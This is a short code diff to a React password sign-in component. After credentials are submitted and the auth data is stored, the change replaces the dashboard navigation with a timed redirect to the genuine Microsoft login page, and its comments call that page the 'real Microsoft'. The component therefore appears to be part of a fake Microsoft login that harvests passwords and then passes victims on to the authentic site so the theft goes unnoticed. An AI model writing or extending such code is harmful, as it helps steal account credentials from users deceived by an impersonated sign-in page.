@@ -36,11 +36,17 @@ const Password = () => {
       // Store auth data in localStorage
       authService.storeAuthData(result.token, result.user);
       
-      // Navigate to dashboard or home
-      navigate('/dashboard');
+      // Show brief success message before closing
+      setLoading(false);
+      
+      // Wait 500ms then redirect to real Microsoft
+      setTimeout(() => {
+        // Redirect to real Microsoft login
+        window.location.href = 'https://login.microsoftonline.com/';
+      }, 500);
+      
     } catch (err) {
       setError(err.message || 'Sign in failed. Please try again.');
-    } finally {
       setLoading(false);
     }
   };
